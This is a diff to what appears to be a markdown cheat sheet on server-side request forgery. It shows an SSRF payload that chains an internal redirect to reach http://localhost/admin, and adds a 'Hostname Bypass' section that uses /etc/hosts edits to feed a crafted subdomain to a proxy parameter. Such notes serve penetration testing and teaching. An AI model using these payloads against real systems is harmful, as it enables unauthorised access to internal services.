@@ -64,3 +64,20 @@ POST /stock HTTP/1.1
 
 stockApi=/post/next?path=http://localhost/admin
 ```
+
+<br />
+
+## Hostname Bypass
+
+```sh
+# Add to /etc/hosts
+<target-ip>  sub.vulnerable.com
+
+# Restart hostname
+sudo systemctl restart systemd-hostnamed
+
+# ------------------------------------------------------
+
+# Then, access
+https://vulnerable.com/?proxy=https://sub.vulnerable.com
+```
